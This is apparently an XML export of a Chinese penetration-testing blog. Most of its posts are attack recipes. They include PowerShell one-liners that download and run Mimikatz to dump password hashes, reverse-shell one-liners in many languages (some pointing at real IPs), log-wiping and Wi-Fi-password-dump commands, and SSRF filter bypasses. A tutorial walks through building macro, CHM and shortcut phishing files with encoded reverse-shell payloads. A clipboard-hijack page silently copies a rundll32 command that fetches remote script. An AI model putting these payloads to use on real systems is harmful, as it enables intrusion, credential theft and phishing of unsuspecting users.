    <content type="text"><![CDATA[ä½¿ç”¨powershellè¿œç¨‹è°ƒç”¨æ¥æŠ“å–ç®¡ç†hashã€‚åœ¨çº¿å¯¼hash1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes åœ¨çº¿å¯¼æ˜æ–‡1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>gethash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŸŸæ¸—é€ä¸­æ‰¾DC]]></title>
    <url>%2Farchives%2F15.html</url>
    <content type="text"><![CDATA[1.net view1net view /domain 2.set log1set log 3.é€šè¿‡srvè®°å½•1nslookup -type=SRV _ldap._tcp.corp 4.ä½¿ç”¨nltest1nltest /dclist:corp 5.ä½¿ç”¨dsquery1DsQuery Server -domain corp 6.ä½¿ç”¨netdom1netdom query pdc è¿™äº›éƒ½æ˜¯winç³»ç»Ÿè‡ªå¸¦çš„å‘½ä»¤ï¼Œæœ‰çš„æ—¶å€™winç‰ˆæœ¬ä¸åŒï¼Œæœ‰çš„å‘½ä»¤ä¼šä¸å­˜åœ¨ï¼Œæ‰€ä»¥å¤šä¸€ç§æ–¹æ³•ï¼Œå¤šä¸€ç§æˆåŠŸçš„å¯èƒ½æ€§ï¼Œå®é™…æ¸—é€ï¼Œè‡ªè¡Œæ ¹æ®ç›®æ ‡ç¯å¢ƒå˜æ¢]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>dc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€è¿‡ç¨‹ä¸­çš„ç«¯å£åå¼¹]]></title>
    <url>%2Farchives%2FGetShellls.html</url>
    <content type="text"><![CDATA[åå¼¹çš„å„ç§å§¿åŠ¿ã€‚bashç‰ˆæœ¬ï¼š1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 æ³¨æ„è¿™ä¸ªæ˜¯ç”±è§£æshellçš„bashå®Œæˆï¼Œæ‰€ä»¥æŸäº›æƒ…å†µä¸‹ä¸æ”¯æŒ perlç‰ˆæœ¬:1perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' pythonç‰ˆæœ¬:1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' phpç‰ˆæœ¬ï¼š1php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' rubyç‰ˆæœ¬ï¼š1ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' ncç‰ˆæœ¬ï¼š1nc -e /bin/sh 223.8.200.234 1234 ncä¸ä½¿ç”¨-eï¼š12mknod /tmp/backpipe p/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe mknod:1mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe javaç‰ˆæœ¬ï¼š123r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/202.103.243.122/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])p.waitFor() luaç‰ˆæœ¬ï¼š1lua -e "require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>bind</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‘½ä»¤è¡Œä¸‹çš„ä¿¡æ¯æœé›†]]></title>
    <url>%2Farchives%2FGet_Informations.html</url>
    <content type="text"><![CDATA[ä½¿ç”¨wmicè¯†åˆ«å®‰è£…åˆ°ç³»ç»Ÿä¸­çš„è¡¥ä¸æƒ…å†µ1C:\&gt; wmic qfe get description,installedOn è¯†åˆ«æ­£åœ¨è¿è¡Œçš„æœåŠ¡12C:\&gt;sc query type= serviceC:\&gt;net start è¯†åˆ«å¼€æœºå¯åŠ¨çš„ç¨‹åºï¼ŒåŒ…æ‹¬è·¯å¾„1C:\&gt;wmic startup list full pingæ¢æµ‹å­˜æ´»ä¸»æœº1D:\&gt;for /L %I in (100,1,254) DO @ping -w 1 -n 1 10.18.180.%I | findstr "TTL=" &gt;&gt; pinglive.txt æŸ¥çœ‹ç³»ç»Ÿä¸­ç½‘å¡çš„IPåœ°å€å’ŒMACåœ°å€1D:\&gt;wmic nicconfig get ipaddress,macaddress æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ˜¯å¦æœ‰å±ä¿ä¿æŠ¤ï¼Œå»¶è¿Ÿæ˜¯å¤šå°‘1D:\&gt;wmic desktop get screensaversecure,screensavertimeout æŸ¥çœ‹ç³»ç»Ÿä¸­å¼€æ”¾çš„å…±äº«12D:\&gt;wmic share get name,pathD:\&gt;net share æŸ¥çœ‹ç³»ç»Ÿä¸­å¼€å¯çš„æ—¥å¿—1C:\&gt;wmic nteventlog get path,filename,writeable æ¸…é™¤ç›¸å…³çš„æ—¥å¿—ï¼ˆè¿™é‡Œæ˜¯å…¨éƒ¨æ¸…é™¤ï¼‰123wevtutil cl "windows powershell"wevtutil cl "security"wevtutil cl "system" æŸ¥çœ‹ç³»ç»Ÿä¸­å®‰è£…çš„è½¯ä»¶ä»¥åŠç‰ˆæœ¬1C:\&gt;wmic product get name,version æŸ¥çœ‹æŸä¸ªè¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ ï¼ˆè·¯å¾„ï¼Œå‘½ä»¤è¡Œå‚æ•°ç­‰ï¼‰1C:\&gt;wmic process where name="chrome.exe" list full ç»ˆæ­¢ä¸€ä¸ªè¿›ç¨‹12D:\&gt;wmic process where name="xshell.exe" call terminateD:\&gt;ntsd -c q -p è¿›ç¨‹çš„PID æ˜¾ç¤ºç³»ç»Ÿä¸­çš„æ›¾ç»è¿æ¥è¿‡çš„æ— çº¿å¯†ç 12D:\&gt;netsh wlan show profiles D:\&gt;netsh wlan show profiles name="profilesçš„åå­—" key=clear æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ˜¯å¦æ˜¯VMWARE1C:\&gt;wmic bios list full | find /i "vmware"]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>information</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRFä¸­çš„ç»•è¿‡å§¿åŠ¿]]></title>
    <url>%2Farchives%2FSSRF_Bypass.html</url>
    <content type="text"><![CDATA[ä»ä»¥ä¸‹URLå…³é”®å­—ä¸­å¯»æ‰¾SSRFæ¼æ´ï¼š1234567891011121314sharewapurllinksrcsourcetargetu3gdisplaysourceURlimageURLdomain... http://127.0.0.1/ è¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹å‡ ç§æ–¹å¼ï¼š 1ã€@1http://abc@127.0.0.1 2ã€æ·»åŠ ç«¯å£å·1http://127.0.0.1:8080 3ã€çŸ­åœ°å€1http://dwz.cn/11SMa 4ã€å¯ä»¥æŒ‡å‘ä»»æ„ipçš„åŸŸåï¼šxip.io123456710.0.0.1.xip.io 10.0.0.1www.10.0.0.1.xip.io 10.0.0.1mysite.10.0.0.1.xip.io 10.0.0.1foo.bar.10.0.0.1.xip.io 10.0.0.1 5ã€ipåœ°å€è½¬æ¢æˆè¿›åˆ¶æ¥è®¿é—®1115.239.210.26 ï¼ 16373751032 é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™ è½¬æˆ 16 è¿›åˆ¶ï¼ç»“æœï¼š73 ef d2 1a ç„¶åæŠŠ 73efd21a è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆ8è¿›åˆ¶ï¼è®¿é—®ä½¿ç”¨http://0x+è½¬æ¢ååå…­è¿›åˆ¶1115.239.210.26 = 0x73.0xef.0xd2.0x1a å…«è¿›åˆ¶1115.239.210.26 = 0163.0357.0322.0032]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨powershell Clientè¿›è¡Œæœ‰æ•ˆé’“é±¼]]></title>
    <url>%2Farchives%2FPowershell_client.html</url>
    <content type="text"><![CDATA[0x00 ç®€ä»‹Powershellæ˜¯windowsä¸‹é¢éå¸¸å¼ºå¤§çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¹¶ä¸”åœ¨windowsä¸­Powershellå¯ä»¥åˆ©ç”¨.NET Frameworkçš„å¼ºå¤§åŠŸèƒ½ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨windows APIï¼Œåœ¨win7/server 2008ä»¥åï¼Œpowershellå·²è¢«é›†æˆåœ¨ç³»ç»Ÿå½“ä¸­ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œä½¿ç”¨powershellèƒ½å¾ˆå¥½çš„bypasså„ç§AVï¼Œåœ¨æ¸—é€æµ‹è¯•ä¸­å¯è°“æ˜¯ä¸€ä¸ªç¥å™¨ã€‚æ­¤æ¬¡ä½¿ç”¨çš„æ˜¯å¼€æºçš„powershellè„šæœ¬é›†nishangä¸­çš„clientæ¥åˆ¶ä½œé’“é±¼æ–‡ä»¶ã€‚å…¶ä¸­officeç±»å‹æ–‡ä»¶å¯ä»¥è¾¾åˆ°é’“é±¼ç›®çš„çš„å‰ææ˜¯officeå·²ç»å¯ç”¨å®ã€‚ 0x01åˆ¶ä½œwordé’“é±¼æ–‡ä»¶ä¸‹è½½powercat ï¼ˆpowershellçš„ncï¼‰ åŠ è½½powercat ï¼š123PS G:\github\Pentest\powershell\powercat-master&gt; . .\powercat.ps1PS G:\github\Pentest\powershell\powercat-master&gt; powercatYou must select either client mode (-c) or listen mode (-l). åŠ è½½ä»¥åä½¿ç”¨powercatå¼€å¯ç›‘å¬ï¼š12345PS G:\github\Pentest\powershell\powercat-master&gt; powercat -l -v -p 4444è¯¦ç»†ä¿¡æ¯: Set Stream 1: TCPè¯¦ç»†ä¿¡æ¯: Set Stream 2: Consoleè¯¦ç»†ä¿¡æ¯: Setting up Stream 1...è¯¦ç»†ä¿¡æ¯: Listening on [0.0.0.0] (port 4444) æµ‹è¯•åŠ è½½Invoke-PowerShellTcpå¹¶æ‰§è¡Œï¼š12PS G:\github\Pentest\powershell\nishang-master\Shells&gt; . .\Invoke-PowerShellTcp.ps1PS G:\github\Pentest\powershell\nishang-master\Shells&gt; Invoke-PowerShellTcp -Reverse -IPAddress 127.0.0.1 -Port 4444 æ‰§è¡Œç»“æœå¦‚ä¸‹å›¾ï¼š å¯ä»¥å‘ç°ï¼Œç›´æ¥è·å–äº†ä¸€ä¸ªpowershellçš„shellã€‚ä¸‹é¢åˆ¶ä½œwordæ–‡ä»¶ã€‚å¤åˆ¶nishangä¸­Invoke-PowerShellTcpOneLine.ps1 clientä»£ç ï¼Œå¦‚ä¸‹ï¼š 1$client = New-Object System.Net.Sockets.TCPClient("192.168.52.129",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close() ä½¿ç”¨Invoke-Encode.ps1è¿›è¡Œç¼–ç ,ç¼–ç ä¹‹å‰è®°å¾—è¦ä¿®æ”¹ipä»¥åŠè‡ªå·±è¦ç›‘å¬çš„ç«¯å£123456789PS G:\github\Pentest\powershell\nishang-master\Shells&gt; cd ..\Utility\PS G:\github\Pentest\powershell\nishang-master\Utility&gt; . .\Invoke-Encode.ps1PS G:\github\Pentest\powershell\nishang-master\Utility&gt; Invoke-Encode -DataToEncode '$client = New-Object System.Net.Sockets.TCPClient("192.168.52.129",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()' -IsString -PostScriptCommandEncoded data written to .\encoded.txtEncoded command written to .\encodedcommand.txt å¤åˆ¶encodedcommand.txtçš„ä»£ç å¦‚ä¸‹ï¼š1Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('TVHNasJAEL4X+g5DSMsuNUtMG6mGCm1oi1CiNEIP4mFNBpMao5gRFfXdu5uY1L3MMHx/M2tGWYo5wQsEuLOGs1+MCMJDQbgUAZIIV9ECqRBjf+SXSGa0u45od56Fq4rTNVpP6nHPLGiDcqmEzEpSfCKF5YxxbzI7EE6mU1PXQoFsITqu++ie7o722dslaYaMmammV0LiG2XMKnwL7BZUrfjCfE4J52DlCDY/emYsSSoeu1rAGh/WGMgl1quMcU/iNfQHg/c8WsVpPueXfKqtXbRJqjfBPJ7JaKFFU9xD5eD079twguGWrIoGV1AHyuQ18QGMUQiGqmy9i7kYSUr0sA/GhaMMtfyEdDC8ZJr2emXGMtubzsT+HZoTi59NSsgaHZW76evzNNiPbFskjJ+9+lf8bFUg47c3fw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd(); åŠ è½½Out-Word.ps1å¹¶ç”Ÿæˆåé—¨ï¼Œè¿™é‡Œè¦æ³¨æ„ï¼Œè¦æŠŠpayloadé‡Œé¢çš„å•å¼•å·å¤šåŠ ä¸€ä¸ªå•å¼•å·ï¼12345PS G:\github\Pentest\powershell\nishang-master\Utility&gt; . ..\Client\Out-Word.ps1PS G:\github\Pentest\powershell\nishang-master\Utility&gt; Out-Word -Payload 'powershell -c Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(''TVHNasJAEL4X+g5DSMsuNUtMG6mGCm1oi1CiNEIP4mFNBpMao5gRFfXdu5uY1L3MMHx/M2tGWYo5wQsEuLOGs1+MCMJDQbgUAZIIV9ECqRBjf+SXSGa0u45od56Fq4rTNVpP6nHPLGiDcqmEzEpSfCKF5YxxbzI7EE6mU1PXQoFsITqu++ie7o722dslaYaMmammV0LiG2XMKnwL7BZUrfjCfE4J52DlCDY/emYsSSoeu1rAGh/WGMgl1quMcU/iNfQHg/c8WsVpPueXfKqtXbRJqjfBPJ7JaKFFU9xD5eD079twguGWrIoGV1AHyuQ18QGMUQiGqmy9i7kYSUr0sA/GhaMMtfyEdDC8ZJr2emXGMtubzsT+HZoTi59NSsgaHZW76evzNNiPbFskjJ+9+lf8bFUg47c3fw=='')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();'Saved to file G:\github\Pentest\powershell\nishang-master\Utility\Salary_Details.doc0PS G:\github\Pentest\powershell\nishang-master\Utility&gt; æ‰§è¡Œwordä»¥åï¼Œåˆ™ä¼šåå¼¹shellï¼Œåœ¨å¯ç”¨å®çš„è®¡ç®—æœºä¸Šæ²¡æœ‰ä»»ä½•æç¤ºï¼Œæœªå¯ç”¨å®çš„è®¡ç®—æœºä¼šæœ‰å¯ç”¨å®çš„æç¤º: è·å–åå¼¹çš„powershellå¯ä»¥å¾ˆå®¹æ˜“çš„å‡çº§åˆ°metasploitçš„meterpreterã€‚ 0x02åˆ¶ä½œexcelé’“é±¼æ–‡ä»¶é¦–å…ˆä½¿ç”¨msfçš„web_deliveryå¼€å¯ä¸€ä¸ªpowershellçš„ç›‘å¬ï¼š12345678910msf &gt; use exploit/multi/script/web_delivery msf exploit(web_delivery) &gt; set target 2target =&gt; 2msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(web_delivery) &gt; set LHOST 192.168.52.129LHOST =&gt; 192.168.52.129msf exploit(web_delivery) &gt; set URIPATH /URIPATH =&gt; msf exploit(web_delivery) &gt; exploit å¼€å¯æœåŠ¡å¦‚ä¸‹å›¾ï¼š ä½¿ç”¨Out-Excel.ps1åˆ¶ä½œexcelé’“é±¼æ–‡ä»¶:12345678D:\temp&gt;powershellWindows PowerShellç‰ˆæƒæ‰€æœ‰ (C) 2015 Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚PS D:\temp&gt; . .\Out-Excel.ps1PS D:\temp&gt; Out-Excel -PayloadURL http://192.168.52.129:8080/ -OutputFile D:\temp\test.xlsSaved to file D:\temp\test.xls0 å…¶ä¸­ http://192.168.52.129:8080/æ˜¯msfå¼€å¯çš„æœåŠ¡åœ°å€ã€‚è¿è¡Œexcelï¼Œè·å–meterpreterä¼šè¯å¦‚ä¸‹å›¾ï¼š 0x03åˆ¶ä½œchmé’“é±¼æ–‡ä»¶ä¾ç„¶ä½¿ç”¨msfå¼€å¯powershellçš„web_deliveryï¼Œä½¿ç”¨Out-CHMåˆ¶ä½œchmé’“é±¼æ–‡ä»¶ï¼š12345678910111213141516PS D:\temp&gt; Out-CHM -PayloadURL http://192.168.52.129:8080/ -HHCPath "C:\Program Files (x86)\HTML Help Workshop"Microsoft HTML Help Compiler 4.74.8702Compiling d:\temp\doc.chmCompile time: 0 minutes, 1 second2 Topics4 Local links4 Internet links0 GraphicsCreated d:\temp\doc.chm, 13,524 bytesCompression increased file by 324 bytes.PS D:\temp&gt; è¿è¡Œdoc.chm,è·å–meterpreterä¼šè¯: ç¼ºç‚¹æ˜¯ä¼šå¼¹å‡ºé»‘æ¡†æ¡†ã€‚ä¸¢ç»™å‡ ä¸ªå°ä¼™ä¼´æµ‹è¯•ï¼Œéƒ½ä¸Šçº¿äº†ï¼ˆ23333ï¼‰ã€‚ 0x04åˆ¶ä½œå¿«æ·æ–¹å¼é’“é±¼æ–‡ä»¶ä¾ç„¶ä½¿ç”¨ä¹‹å‰å¼€å¯çš„web_delivery,ä½¿ç”¨Out-Shortcutåˆ¶ä½œå¿«æ·æ–¹å¼é’“é±¼æ–‡ä»¶ã€‚ 123PS D:\temp&gt; . .\Out-Shortcut.ps1PS D:\temp&gt; Out-Shortcut -PayloadURL http://192.168.52.129:8080/ -HotKey 'F3' -Icon 'notepad.exe'The Shortcut file has been written as D:\temp\Shortcut to File Server.lnk å…¶ä¸­PayloadURLä¸ºweb_deliveryæœåŠ¡åœ°å€ï¼ŒIconä¸ºå¿«æ·æ–¹å¼çš„å›¾æ ‡ï¼ŒHotKeyä¸ºå¿«æ·é”®ã€‚å³é”®å±æ€§å¿«æ·æ–¹å¼ï¼Œå¯ä»¥çœ‹åˆ°å¿«æ·æ–¹å¼æŒ‡å‘æˆ‘ä»¬çš„æœåŠ¡åœ°å€ï¼Œå¦‚ä¸‹å›¾ï¼š è¿è¡Œå¿«æ·æ–¹å¼ï¼Œå¯ä»¥è·å–meterpreterä¼šè¯ï¼š 0x05å°ç»“æµ‹è¯•å‘ç°ï¼Œä¸Šé¢å‡ ä¸ªæ–¹å¼è¿˜æ˜¯æŒºæœ‰æ•ˆçš„ï¼Œä½¿ç”¨chmæ–¹å¼æ›´å®¹æ˜“æˆåŠŸäº›ï¼Œå› ä¸ºä½¿ç”¨äº†powershellï¼Œé˜²æŠ¤è½¯ä»¶å¹¶æ²¡æœ‰æŠ¥è­¦ï¼Œå…¶ä¸­è¿˜æœ‰WebQueryã€javaä»¥åŠhtaç±»å‹çš„é’“é±¼æ–‡ä»¶ç”Ÿæˆè„šæœ¬ï¼Œç¬”è€…æµ‹è¯•javaä»¥åŠhtaæ–¹å¼çš„æ²¡æœ‰æˆåŠŸï¼Œè¿™é‡Œå°±ä¸ä»‹ç»äº†ï¼Œè‡³äºWebQueryæ–¹å¼çš„åœ¨FBä¸Šå·²ç»æœ‰è¯¦ç»†çš„ä»‹ç»ï¼šä¼ é€é—¨ æœ‰å…´è¶£çš„å°ä¼™ä¼´å¯ä»¥ç»§ç»­ç ”ç©¶ç ”ç©¶ã€‚]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2Fa.html</url>
    <content type="text"><![CDATA[Copy the text below and run it in your terminal for totally not evil things to happen. echo "not evil" function copyTextToClipboard(text) { var textArea = document.createElement("textarea"); // // *** This styling is an extra step which is likely not required. *** // // Why is it here? To ensure: // 1. the element is able to have focus and selection. // 2. if element was to flash render it has minimal visual impact. // 3. less flakyness with selection and copying which **might** occur if // the textarea element is not visible. // // The likelihood is the element won't even render, not even a flash, // so some of these are just precautions. However in IE the element // is visible whilst the popup box asking the user for permission for // the web page to copy to the clipboard. // // Place in top-left corner of screen regardless of scroll position. textArea.style.position = 'fixed'; textArea.style.top = 0; textArea.style.left = 0; // Ensure it has a small width and height. Setting to 1px / 1em // doesn't work as this gives a negative w/h on some browsers. textArea.style.width = '2em'; textArea.style.height = '2em'; // We don't need padding, reducing the size if it does flash render. textArea.style.padding = 0; // Clean up any borders. textArea.style.border = 'none'; textArea.style.outline = 'none'; textArea.style.boxShadow = 'none'; // Avoid flash of white box if rendered for any reason. textArea.style.background = 'transparent'; textArea.value = text; document.body.appendChild(textArea); textArea.select(); try { var successful = document.execCommand('copy'); var msg = successful ? 'successful' : 'unsuccessful'; console.log('Copying text command was ' + msg); } catch (err) { console.log('Oops, unable to copy'); } document.body.removeChild(textArea); } document.addEventListener('keydown', function(event) { var ms = 800; var start = new Date().getTime(); var end = start; while(end < start + ms) { end = new Date().getTime(); } copyTextToClipboard('rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")\ncls\necho "not evil"'); }); L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
  </entry>
  <entry>
    <title><![CDATA[404 Not Foundï¼šè¯¥é¡µæ— æ³•æ˜¾ç¤º]]></title>
    <url>%2F%2F404.html</url>
    <content type="text"><![CDATA[&lt;!DOCTYPE html&gt; 404 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Archive]]></title>
    <url>%2Farchive%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[Categories]]></title>
    <url>%2Fcategories%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[å‹æƒ…é“¾æ¥]]></title>
    <url>%2Ffriends%2Findex.html</url>
    <content type="text"><![CDATA[å¿«æ¥äº¤æ¢å‹é“¾å§~~ äº¤æ¢å‹é“¾é¡»çŸ¥ ä¼˜å…ˆäºæŠ€æœ¯ã€ç”Ÿæ´»åˆ†äº«ç±»åšå®¢ç«™ç‚¹å‹é“¾ï¼Œåšå†³ä¸å’Œè®ºå›ã€å¯¼èˆªã€å«æœ‰æš´åŠ›ç­‰ä¸å¥åº·ä¿¡æ¯å†…å®¹ç«™ç‚¹åšä»»ä½•äº¤æ¢ã€‚ ç”³è¯·é“¾æ¥å‰è¯·å…ˆæ·»åŠ æœ¬åšé“¾æ¥ã€‚ ç”³è¯·è¯·æä¾›ï¼šç«™ç‚¹åç§°ã€ç«™ç‚¹é“¾æ¥ï¼ˆè¯·æä¾› https åè®®é“¾æ¥ï¼‰ã€‚ ä¸€äº›å¤§ä½¬å’Œä»–ä»¬çš„åšå®¢ã€‚ ä¸‰å¥½å­¦ç”Ÿåšå®¢ zEqueueâ€™s Blog erevusâ€™s blog Evi1oXâ€™s blog ç»´å°¼ç†Šå®è´Betaçš„ç†Šçª bsmali4çš„å°çª wdogâ€™s blog Stormâ€™s Blog freearootâ€™s Blog bPJoanna Patrilicâ€™s Blog TonghuaRootâ€™s BloG. hihi007â€™s Blog å€¾æ—‹çš„åšå®¢ Ceil Profile]]></content>
  </entry>
  <entry>
    <title><![CDATA[search]]></title>
    <url>%2Fsearch%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[Tags]]></title>
    <url>%2Ftags%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[Tools]]></title>
    <url>%2Ftools%2Findex.html</url>
    <content type="text"><![CDATA[1 .PHPåºåˆ—åŒ–æ³¨å…¥ Link 2 .Webshells Link 3 .Powershellå–è¯å·¥å…· Link 4 .å„ç§å°å·¥å…· Link 5 .DLL_Hijacker Link 6 .WebViewæ£€æµ‹ Link 7 .Uxssæ£€æµ‹ Link POC1 POC2 8.FlashCSRF Link 9.åœ¨çº¿å·¥å…· Link 10.å›¾å½¢åŒ–PowerShellçš„åœ¨çº¿ç¼–è¾‘å™¨ Link 11.Duck ToolKit Link 12.åœ¨çº¿Cæ®µæŸ¥è¯¢ Link 13.reg2powershell Link 14.XSSOR Link github 15.æ­£åˆ™åˆ†æ Link 16.Powershellå‹ç¼©æ–‡ä»¶ Linkâ€¦.]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fweibo.html</url>
    <content type="text"><![CDATA[weibo test console.log('init...'); window.__fla_ready = function() { console.log('loading...'); fla.Load('http://www.weibo.com/messages?topnav=1#'); }; window.__fla_complete = function(data) { document.write(data); console.info('recv:\n%s', data); };]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fwebview.html</url>
    <content type="text"><![CDATA[WebView æ¼æ´æ£€æµ‹ å¦‚æœå½“å‰ app å­˜åœ¨æ¼æ´ï¼Œå°†ä¼šåœ¨é¡µé¢ä¸­è¾“å‡ºå­˜åœ¨æ¼æ´çš„æ¥å£æ–¹ä¾¿ç¨‹åºå‘˜åšå‡ºä¿®æ”¹ï¼š function check() { for (var obj in window) { try { if ("getClass" in window[obj]) { try{ window[obj].getClass(); document.write(''+obj+''); document.write(''); }catch(e){ } } } catch(e) { } } } check(); æ£€æµ‹å‡ºæ¼æ´ä½¿ç”¨ä»¥ä¸‹è„šæœ¬éªŒè¯(è‡ªè¡Œä¿®æ”¹)ï¼š 1 .å†™æ–‡ä»¶ 2 .åå¼¹shell 3 .å‘çŸ­ä¿¡ 3 .æŒ‚é©¬ å‚è€ƒ L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2FflashCSRF%2Findex.html</url>
    <content type="text"><![CDATA[document.location = 'ContentHijacking.html';]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2FflashCSRF%2FContentHijacking.html</url>
    <content type="text"><![CDATA[Cross Site Content Hijacking Demo! html, body { height: 100%; overflow: auto; } body { padding: 0; margin: 0; } table { /* table-layout: fixed;*/ border-collapse: collapse; border-spacing: 0; width: 100%; } th { font-family: verdana; color: white; vertical-align: middle; background-color: black; } td { font-family: verdana; word-wrap:break-word; height: 30px; max-width: 600px; } #silverlightControlHost { height: 100%; text-align:center; } .info { background: #ffff00; } .logdata:nth-last-child(2n-1) { background: #ccc; } .logdata { white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word; overflow:auto; max-height: 300px; } .note { font-family: courier; font-size: 15px; } //PDF related var isPDFLoaded = 0; function createMessageHandler(objPDF) { if(objPDF != null){ objPDF.messageHandler = { onMessage: function(msg) { try{ if(msg[0]=='loaded' && msg[1]=='1'){ // The created PDF files sends the load message continuously for 5 seconds to make sure HTML is ready... if(isPDFLoaded===1) return; isPDFLoaded = 1; pdfLoaded(); }else{ javaScriptLogData(msg[0]); } }catch(e){ } }, onError: function(error, msg) { alert(error.message); } } } } var 